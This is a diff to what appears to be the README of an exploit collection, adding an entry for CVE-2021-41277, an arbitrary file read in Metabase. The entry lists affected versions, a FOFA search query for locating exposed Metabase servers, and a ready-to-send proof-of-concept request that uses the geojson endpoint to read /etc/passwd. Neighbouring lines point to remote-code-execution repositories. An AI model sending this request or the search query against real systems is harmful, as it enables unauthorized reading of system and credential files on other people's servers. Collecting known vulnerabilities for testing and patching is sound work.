@@ -27,6 +27,19 @@ Ref: https://github.com/fengwenhua/CVE-2021-37580
 Ref: https://github.com/cckuailong/YarnRpcRCE
 ```
 
+[CVE-2021-41277 MetaBase Arbitrary File Read](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41277.yaml)
+```
+MetaBase < 0.40.5
+1.0.0 <= MetaBase < 1.40.5
+
+FOFA:
+
+app="Metabase"
+
+PoC:
+
+GET /api/geojson?url=file:/etc/passwd HTTP/1.1
+```
 ### Note
 
 All content comes from the Internet, if there is a copyright problem, please contact me to delete.
